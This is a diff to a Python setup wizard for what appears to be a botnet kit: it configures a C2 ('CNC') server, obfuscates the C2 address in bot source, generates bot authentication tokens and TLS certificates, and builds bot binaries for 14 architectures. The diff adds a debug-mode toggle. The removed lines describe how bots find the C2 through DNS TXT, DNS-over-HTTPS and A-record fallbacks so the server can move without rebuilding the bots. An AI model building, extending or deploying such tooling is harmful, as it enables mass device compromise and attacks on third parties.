@@ -336,6 +336,39 @@ def update_cnc_main_go(
     return True
 
 
+def update_bot_debug_mode(bot_path: str, debug_enabled: bool) -> bool:
+    """Update the debugMode variable in Bot main.go"""
+    main_go_path = os.path.join(bot_path, "main.go")
+
+    try:
+        with open(main_go_path, "r") as f:
+            content = f.read()
+
+        debug_value = "true" if debug_enabled else "false"
+        content = re.sub(
+            r"var debugMode\s*=\s*(true|false)",
+            f"var debugMode = {debug_value}",
+            content,
+        )
+
+        with open(main_go_path, "w") as f:
+            f.write(content)
+
+        return True
+    except Exception as e:
+        error(f"Failed to update debug mode: {e}")
+        return False
+
+
+def prompt_debug_mode() -> bool:
+    """Prompt user to set debug mode with explanation"""
+    print(f"\n{Colors.BRIGHT_CYAN}🔧 Debug Mode{Colors.RESET}")
+    print(
+        f"{Colors.DIM}   Logs function calls & connections to console (dev only){Colors.RESET}\n"
+    )
+    return confirm("Would you like to enable debug mode?", default=False)
+
+
 def update_bot_main_go(
     bot_path: str,
     magic_code: str,
@@ -678,69 +711,32 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     """Run full setup - everything new"""
     config = {}
 
+    # Debug Mode Configuration (before main setup)
+    debug_enabled = prompt_debug_mode()
+    config["debug_mode"] = debug_enabled
+
+    if debug_enabled:
+        warning("Debug mode ENABLED - remember to disable for production!")
+    else:
+        success("Debug mode disabled - ready for production")
+    print()
+
     # Step 1: C2 Address
     print_step(1, 5, "C2 Server Configuration")
 
-    # Print comprehensive DNS resolution info
-    print_info_box(
-        "📡 C2 Resolution - How Bots Find Your Server",
-        [
-            f"{Colors.BRIGHT_WHITE}The bot uses a multi-method resolution system:{Colors.RESET}",
-            "",
-            f"{Colors.BRIGHT_GREEN}Resolution Order (automatic fallback):{Colors.RESET}",
-            f"  {Colors.BRIGHT_CYAN}1.{Colors.RESET} DNS TXT Record  → Checks for TXT record on domain",
-            f"  {Colors.BRIGHT_CYAN}2.{Colors.RESET} DoH TXT Lookup  → Cloudflare/Google DNS-over-HTTPS",
-            f"  {Colors.BRIGHT_CYAN}3.{Colors.RESET} A Record        → Falls back to standard DNS A record",
-            f"  {Colors.BRIGHT_CYAN}4.{Colors.RESET} Direct IP       → Uses the value as-is if IP:port",
-            "",
-            f"{Colors.BRIGHT_YELLOW}You can enter:{Colors.RESET}",
-            f"  • {Colors.WHITE}Direct IP{Colors.RESET}      → 192.168.1.100 (simplest)",
-            f"  • {Colors.WHITE}Domain name{Colors.RESET}    → c2.example.com (uses A record)",
-            f"  • {Colors.WHITE}TXT domain{Colors.RESET}     → lookup.example.com (advanced)",
-        ],
+    print(
+        f"{Colors.DIM}   Enter IP address or domain. Bots will connect on port 443.{Colors.RESET}\n"
     )
 
-    print_info_box(
-        "🔧 DNS Record Setup Guide",
-        [
-            f"{Colors.BRIGHT_GREEN}Option A: Direct IP (No DNS needed){Colors.RESET}",
-            f"  Just enter your server IP. Bots connect directly.",
-            "",
-            f"{Colors.BRIGHT_GREEN}Option B: A Record (Standard DNS){Colors.RESET}",
-            f"  Create DNS A record: c2.example.com → YOUR_IP",
-            f"  Enter: c2.example.com",
-            "",
-            f"{Colors.BRIGHT_GREEN}Option C: TXT Record (Stealth/Flexible){Colors.RESET}",
-            f"  Create DNS TXT record with one of these formats:",
-            f"    {Colors.BRIGHT_CYAN}c2=IP:PORT{Colors.RESET}     → c2=192.168.1.100:443",
-            f"    {Colors.BRIGHT_CYAN}ip=IP:PORT{Colors.RESET}     → ip=10.0.0.1:443",
-            f"    {Colors.BRIGHT_CYAN}IP:PORT{Colors.RESET}        → 192.168.1.100:443 (raw)",
-            f"    {Colors.BRIGHT_CYAN}IP{Colors.RESET}             → 192.168.1.100 (auto :443)",
-            "",
-            f"{Colors.DIM}TXT records let you change C2 IP without rebuilding bots!{Colors.RESET}",
-        ],
-    )
-
-    c2_ip = prompt("Enter C2 server IP or domain", "127.0.0.1")
+    c2_ip = prompt("What is your C2 server IP or domain?", "127.0.0.1")
     c2_address = f"{c2_ip}:443"
     config["c2_address"] = c2_address
 
-    admin_port = prompt("Enter admin CLI port", "420")
+    admin_port = prompt("What port would you like for admin CLI?", "420")
     config["admin_port"] = admin_port
 
     print()
-    success(f"C2 configured: {c2_address}")
-    success(f"Admin port: {admin_port}")
-    info("Bot connection port is fixed at 443 (TLS)")
-
-    # Show what DNS records to create if using domain
-    if not c2_ip.replace(".", "").isdigit():  # Not a pure IP
-        print()
-        warning("Since you're using a domain, ensure DNS is configured:")
-        print(f"  {Colors.CYAN}For A record:{Colors.RESET} {c2_ip} → YOUR_SERVER_IP")
-        print(
-            f'  {Colors.CYAN}For TXT record:{Colors.RESET} {c2_ip} → "c2=YOUR_SERVER_IP:443"'
-        )
+    success(f"C2: {c2_address} | Admin port: {admin_port}")
 
     # Step 2: Security Tokens
     print_step(2, 5, "Security Token Generation")
@@ -749,16 +745,14 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     auto_protocol = generate_protocol_version()
     crypt_seed = generate_crypt_seed()
 
-    info(f"Auto-generated Magic Code: {Colors.BRIGHT_WHITE}{auto_magic}{Colors.RESET}")
-    info(
-        f"Auto-generated Protocol Version: {Colors.BRIGHT_WHITE}{auto_protocol}{Colors.RESET}"
+    print(
+        f"{Colors.DIM}   Tokens authenticate bots to your C2. Auto-generated is recommended.{Colors.RESET}\n"
     )
-    info(f"Auto-generated Crypt Seed: {Colors.BRIGHT_WHITE}{crypt_seed}{Colors.RESET}")
-    print()
 
-    if confirm("Use auto-generated security tokens?"):
+    if confirm("Would you like to use auto-generated security tokens?"):
         magic_code = auto_magic
         protocol_version = auto_protocol
+        success(f"Magic: {magic_code} | Protocol: {protocol_version}")
     else:
         magic_code = prompt("Enter custom magic code", auto_magic)
         protocol_version = prompt("Enter custom protocol version", auto_protocol)
@@ -781,58 +775,77 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     # Step 3: Certificates
     print_step(3, 5, "TLS Certificate Generation")
 
-    info("Certificate details (press Enter for defaults):")
-    print()
+    print(
+        f"{Colors.DIM}   TLS certificates encrypt bot communications. Press Enter for defaults.{Colors.RESET}\n"
+    )
 
-    cert_config = {
-        "country": prompt("Country code (2 letter)", "US"),
-        "state": prompt("State/Province", "California"),
-        "city": prompt("City", "San Francisco"),
-        "org": prompt("Organization", "Security Research"),
-        "cn": prompt("Common Name (domain)", c2_ip),
-        "days": int(prompt("Valid days", "365")),
-    }
+    if confirm("Would you like to customize certificate details?", default=False):
+        cert_config = {
+            "country": prompt("Country code (2 letter)", "US"),
+            "state": prompt("State/Province", "California"),
+            "city": prompt("City", "San Francisco"),
+            "org": prompt("Organization", "Security Research"),
+            "cn": prompt("Common Name (domain)", c2_ip),
+            "days": int(prompt("Valid days", "365")),
+        }
+    else:
+        cert_config = {
+            "country": "US",
+            "state": "California",
+            "city": "San Francisco",
+            "org": "Security Research",
+            "cn": c2_ip,
+            "days": 365,
+        }
     config["cert"] = cert_config
 
     if not generate_certificates(cnc_path, cert_config):
         error("Certificate generation failed!")
-        if not confirm("Continue without new certificates?"):
+        if not confirm("Would you like to continue without new certificates?"):
             sys.exit(1)
     else:
-        success("TLS certificates generated successfully")
+        success("TLS certificates generated")
 
     # Step 4: Update Source
     print_step(4, 5, "Updating Source Code")
 
-    info("Updating cnc/main.go...")
-    if update_cnc_main_go(cnc_path, magic_code, protocol_version, admin_port):
-        success("CNC configuration updated")
-    else:
-        error("Failed to update CNC configuration")
+    print(
+        f"{Colors.DIM}   Applying your configuration to source files...{Colors.RESET}\n"
+    )
 
-    info("Updating bot/main.go...")
+    if update_cnc_main_go(cnc_path, magic_code, protocol_version, admin_port):
+        success("CNC configured")
+    else:
+        error("Failed to update CNC")
+
     if update_bot_main_go(
         bot_path, magic_code, protocol_version, obfuscated_c2, crypt_seed
     ):
-        success("Bot configuration updated")
+        success("Bot configured")
     else:
-        error("Failed to update Bot configuration")
+        error("Failed to update Bot")
+
+    if update_bot_debug_mode(bot_path, config["debug_mode"]):
+        success(f"Debug mode: {'ON' if config['debug_mode'] else 'OFF'}")
+    else:
+        warning("Failed to set debug mode")
 
     # Step 5: Build
     print_step(5, 5, "Building Binaries")
 
-    if confirm("Build CNC server?"):
+    if confirm("Would you like to build the CNC server?"):
         if build_cnc(cnc_path):
-            success("CNC server built successfully")
+            success("CNC server built")
         else:
-            warning("CNC build failed - you can build manually later")
+            warning("CNC build failed - build manually with: cd cnc && go build")
 
-    if confirm("Build bot binaries (14 architectures)?"):
-        warning("This will take several minutes...")
+    if confirm(
+        "Would you like to build bot binaries? (14 architectures, takes a few mins)"
+    ):
         if build_bots(bot_path):
-            success("Bot binaries built successfully")
+            success("Bot binaries built")
         else:
-            warning("Bot build had issues - check bot/bins/ folder")
+            warning("Bot build had issues - check bot/bins/")
 
     # Save config
     config_file = save_config(base_path, config)
@@ -843,6 +856,15 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
 
 def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
     """Update C2 URL only - keep existing magic code, protocol, certs"""
+
+    # Debug Mode Configuration (before main setup)
+    debug_enabled = prompt_debug_mode()
+
+    if debug_enabled:
+        warning("Debug mode ENABLED - remember to disable for production!")
+    else:
+        success("Debug mode disabled - ready for production")
+    print()
 
     # Get existing config
     info("Reading existing configuration...")
@@ -877,41 +899,11 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
     # Step 1: New C2 Address
     print_step(1, 2, "New C2 Address")
 
-    # Print DNS resolution info
-    print_info_box(
-        "📡 C2 Resolution - How Bots Find Your Server",
-        [
-            f"{Colors.BRIGHT_WHITE}The bot uses a multi-method resolution system:{Colors.RESET}",
-            "",
-            f"{Colors.BRIGHT_GREEN}Resolution Order (automatic fallback):{Colors.RESET}",
-            f"  {Colors.BRIGHT_CYAN}1.{Colors.RESET} DNS TXT Record  → Checks for TXT record on domain",
-            f"  {Colors.BRIGHT_CYAN}2.{Colors.RESET} DoH TXT Lookup  → Cloudflare/Google DNS-over-HTTPS",
-            f"  {Colors.BRIGHT_CYAN}3.{Colors.RESET} A Record        → Falls back to standard DNS A record",
-            f"  {Colors.BRIGHT_CYAN}4.{Colors.RESET} Direct IP       → Uses the value as-is if IP:port",
-            "",
-            f"{Colors.BRIGHT_YELLOW}You can enter:{Colors.RESET}",
-            f"  • {Colors.WHITE}Direct IP{Colors.RESET}      → 192.168.1.100",
-            f"  • {Colors.WHITE}Domain name{Colors.RESET}    → c2.example.com",
-        ],
+    print(
+        f"{Colors.DIM}   Enter your new IP address or domain. Bots connect on port 443.{Colors.RESET}\n"
     )
 
-    print_info_box(
-        "💡 Pro Tip: TXT Records for Easy Migration",
-        [
-            f"If you use a domain with TXT records, you can change",
-            f"your C2 IP just by updating the DNS TXT record!",
-            "",
-            f"{Colors.BRIGHT_GREEN}TXT Record Formats:{Colors.RESET}",
-            f"  {Colors.BRIGHT_CYAN}c2=IP:PORT{Colors.RESET}     → c2=192.168.1.100:443",
-            f"  {Colors.BRIGHT_CYAN}ip=IP:PORT{Colors.RESET}     → ip=10.0.0.1:443",
-            f"  {Colors.BRIGHT_CYAN}IP:PORT{Colors.RESET}        → 192.168.1.100:443 (raw)",
-            f"  {Colors.BRIGHT_CYAN}IP{Colors.RESET}             → 192.168.1.100 (auto :443)",
-            "",
-            f"{Colors.DIM}Bots will auto-discover new IP without rebuild!{Colors.RESET}",
-        ],
-    )
-
-    c2_ip = prompt("Enter NEW C2 server IP/domain")
+    c2_ip = prompt("What is your new C2 server IP or domain?")
     if not c2_ip:
         error("C2 address is required!")
         return
@@ -919,19 +911,9 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
     c2_address = f"{c2_ip}:443"
     config["c2_address"] = c2_address
 
-    success(f"New C2 configured: {c2_address}")
-
-    # Show what DNS records to create if using domain
-    if not c2_ip.replace(".", "").isdigit():  # Not a pure IP
-        print()
-        warning("Since you're using a domain, ensure DNS is configured:")
-        print(f"  {Colors.CYAN}For A record:{Colors.RESET} {c2_ip} → YOUR_SERVER_IP")
-        print(
-            f'  {Colors.CYAN}For TXT record:{Colors.RESET} {c2_ip} → "c2=YOUR_SERVER_IP:443"'
-        )
+    success(f"New C2: {c2_address}")
 
     # Obfuscate with existing crypt_seed
-    info("Applying obfuscation with existing crypt seed...")
     obfuscated_c2 = obfuscate_c2(c2_address, config["crypt_seed"])
     config["obfuscated_c2"] = obfuscated_c2
 
@@ -944,8 +926,8 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
     # Step 2: Update & Build
     print_step(2, 2, "Update & Build")
 
-    # Only update bot with new C2
-    info("Updating bot/main.go with new C2...")
+    print(f"{Colors.DIM}   Applying new C2 address to bot source...{Colors.RESET}\n")
+
     if update_bot_main_go(
         bot_path,
         config["magic_code"],
@@ -953,17 +935,20 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
         obfuscated_c2,
         config["crypt_seed"],
     ):
-        success("Bot configuration updated")
+        success("Bot configured")
     else:
-        error("Failed to update Bot configuration")
+        error("Failed to update Bot")
 
-    # Build bots only
-    if confirm("Build bot binaries?"):
-        warning("This will take several minutes...")
+    if update_bot_debug_mode(bot_path, debug_enabled):
+        success(f"Debug mode: {'ON' if debug_enabled else 'OFF'}")
+    else:
+        warning("Failed to set debug mode")
+
+    if confirm("Would you like to build bot binaries? (takes a few mins)"):
         if build_bots(bot_path):
-            success("Bot binaries built successfully")
+            success("Bot binaries built")
         else:
-            warning("Bot build had issues - check bot/bins/ folder")
+            warning("Bot build had issues - check bot/bins/")
 
     # Summary
     print(f"\n{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}")
